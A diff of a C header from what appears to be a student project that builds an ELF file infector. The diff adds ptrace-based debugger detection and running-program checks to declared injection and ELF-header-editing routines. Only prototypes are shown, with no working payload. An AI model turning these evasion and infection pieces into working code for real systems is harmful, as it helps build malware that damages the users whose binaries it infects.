@@ -6,7 +6,7 @@
 /*   By: yyyyyy <yyyyyy@42.fr>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/08/01 17:16:00 by yyyyyy            #+#    #+#             */
-/*   Updated: 2026/01/19 17:30:58 by yyyyyy           ###   ########.fr       */
+/*   Updated: 2026/01/20 15:37:55 by yyyyyy           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -15,8 +15,10 @@
 
 #include <elf.h>
 #include <fcntl.h>
+#include <stdbool.h>
 #include <stdio.h>
 #include <sys/mman.h>
+#include <sys/ptrace.h>
 #include <sys/stat.h>
 #include <sys/types.h>
 
@@ -65,6 +67,8 @@ typedef struct s_elf
 	t_stat stat;
 } t_elf;
 
+#define write ft_write
+
 /********************************* PROTOTYPES *********************************/
 
 // TODO: protos from famine
@@ -81,14 +85,18 @@ ElfW(Phdr) * find_executed_segment(t_elf elf);
 void inject(t_file file, t_elf elf, void *begin_ptr);
 void edit_elf_header(t_elf elf);
 */
+int is_program_running(const char *target);
+int is_debugged(void);
 void signature(char str[]);
 int ft_strncmp(const char *s1, const char *s2, unsigned n);
 int ft_strcmp(const char *s1, const char *s2);
 void *memcpy(void *dst, void *src, unsigned n);
+char *ft_strchr(const char *s, int c);
 void *ft_memmove(void *dst, const void *src, size_t len);
 char *ft_strcpy(char *dest, char *src);
 char *ft_strcat(char *dest, char *src);
 void ft_bzero(void *s, unsigned n);
+int ft_atoi(const char *str);
 uint64_t ft_syscall(uint64_t syscall_number, uint64_t arg1, uint64_t arg2,
 					uint64_t arg3, uint64_t arg4, uint64_t arg5, uint64_t arg6);
 
